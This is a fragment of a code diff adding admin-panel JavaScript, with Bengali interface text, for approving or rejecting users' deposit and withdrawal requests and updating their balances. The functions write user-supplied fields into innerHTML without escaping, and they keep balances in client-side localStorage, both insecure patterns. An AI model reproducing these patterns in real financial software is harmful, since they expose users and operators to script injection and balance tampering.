+        tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:#94a3b8;">কোনো পেন্ডিং রিকোয়েস্ট নেই।</td></tr>`;
+        return;
+    }
+
+    pendingTxs.forEach(t => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+            <td><b>${t.userName || t.userEmail}</b></td>
+            <td style="color:#f59e0b;"><b>${t.type}</b></td>
+            <td>${t.method}</td>
+            <td>${t.phone}</td>
+            <td style="color:#38bdf8;"><b>৳${t.amount.toLocaleString('bn-BD')}</b></td>
+            <td><code>${t.trxId}</code></td>
+            <td>
+                <button onclick="approveTransaction(${t.id})" class="btn-approve">Approve</button>
+                <button onclick="rejectTransaction(${t.id})" class="btn-reject">Reject</button>
+            </td>
+        `;
+        tbody.appendChild(tr);
+    });
+}
+
+// সেন্ট্রাল প্রসেসড ট্রানজেকশন হিস্ট্রি
+function renderAdminAllHistory() {
+    const tbody = document.getElementById('adminAllHistoryTableBody');
+    if (!tbody) return;
+    tbody.innerHTML = '';
+
+    if (allTransactions.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">কোনো ট্রানজেকশন ডাটা নেই।</td></tr>`;
+        return;
+    }
+
+    allTransactions.forEach(t => {
+        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
+        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
+        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;
+
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+            <td><b>${t.userName || t.userEmail}</b></td>
+            <td>${t.type}</td>
+            <td>${t.method}</td>
+            <td>৳${t.amount.toLocaleString('bn-BD')}</td>
+            <td><code>${t.trxId}</code></td>
+            <td>${statusBadge}</td>
+        `;
+        tbody.appendChild(tr);
+    });
+}
+
+// উইথড্র বা ডিপোজিট অ্যাপ্রুভ
+async function approveTransaction(txId) {
+    const txIndex = allTransactions.findIndex(t => t.id === txId);
+    if (txIndex === -1) return;
+
+    const tx = allTransactions[txIndex];
+    const userIndex = usersDatabase.findIndex(u => u.email === tx.userEmail);
+
+    if (userIndex !== -1) {
+        const targetUser = usersDatabase[userIndex];
+        if (!targetUser.balances) targetUser.balances = { ...defaultBalances };
+        if (targetUser.totalBalance === undefined) {
+            targetUser.totalBalance = targetUser.balances.WorldBank !== undefined ? targetUser.balances.WorldBank : defaultTotalBalance;
+        }
+
+        if (tx.type === 'Withdraw') {
+            targetUser.balances[tx.method] = (targetUser.balances[tx.method] || 0) - tx.amount;
+            targetUser.totalBalance -= tx.amount;
+        } else if (tx.type === 'Deposit') {
+            targetUser.balances[tx.method] = (targetUser.balances[tx.method] || 0) + tx.amount;
+            targetUser.totalBalance += tx.amount;
+        }
+
+        usersDatabase[userIndex] = targetUser;
+        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
+        await saveUserToFirebase(targetUser);
+
+        allTransactions[txIndex].status = 'Approved';
+        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
+        await saveTxToFirebase(allTransactions[txIndex]);
+
+        sendTelegramNotification(`✅ <b>ট্রানজেকশন অ্যাপ্রুভড!</b>\n\n👤 ইউজার: ${tx.userName}\n💰 পরিমাণ: ৳${tx.amount}\n🏦 মেথড: ${tx.method}\n⚡ মেইন ব্যালেন্স ও ক্লাউড ডাটাবেসে চিরস্থায়ীভাবে আপডেট করা হয়েছে।`);
+
+        alert('ট্রানজেকশন সফলভাবে অ্যাপ্রুভ করা হয়েছে এবং ক্লাউড ডাটাবেসে স্থায়ীভাবে ব্যালেন্স আপডেট করা হয়েছে!');
+
+        if (activeUser && activeUser.email === targetUser.email) {
+            activeUser = targetUser;
+            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
+            renderBalances();
+        }
+
+        renderAdminPendingList();
+        renderAdminUsersList();
+        renderAdminAllHistory();
+    }
+}
+
+// রিজেক্ট লজিক
+async function rejectTransaction(txId) {
+    const txIndex = allTransactions.findIndex(t => t.id === txId);
+    if (txIndex !== -1) {
+        allTransactions[txIndex].status = 'Rejected';
+        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
+        await saveTxToFirebase(allTransactions[txIndex]);
+
+        sendTelegramNotification(`❌ <b>ট্রানজেকশন রিজেক্টেড!</b>\n\n👤 ইউজার: ${allTransactions[txIndex].userName}\n⚠️ মেইন ব্যালেন্স অপরিবর্তিত রাখা হয়েছে।`);
+
+        alert('উইথড্র রিকোয়েস্টটি রিজেক্ট করা হয়েছে। ইউজারের মেইন ব্যালেন্স থেকে কোনো টাকা কাটা হয়নি।');
+        
+        renderAdminPendingList();
+        renderAdminAllHistory();
+    }
 }
